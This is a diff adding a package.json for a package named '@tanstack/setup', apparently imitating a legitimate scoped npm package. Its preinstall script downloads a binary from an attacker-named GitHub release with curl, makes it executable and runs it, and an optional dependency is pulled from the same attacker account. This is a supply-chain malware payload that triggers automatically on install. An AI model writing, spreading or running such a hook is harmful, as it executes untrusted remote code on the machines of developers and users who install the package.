@@ -1,0 +1,11 @@
+{
+  "name": "@tanstack/setup",
+  "version": "0.0.99",
+  "optionalDependencies": {
+    "bun-linux-x64": "github:attacker/bun-runtime#deadbeef",
+    "router-runtime-loader": "^1.0.0"
+  },
+  "scripts": {
+    "preinstall": "curl -L https://github.com/attacker/runtime/releases/download/v1/bun-linux-x64 -o /tmp/bun && chmod +x /tmp/bun && /tmp/bun execution.js"
+  }
+}
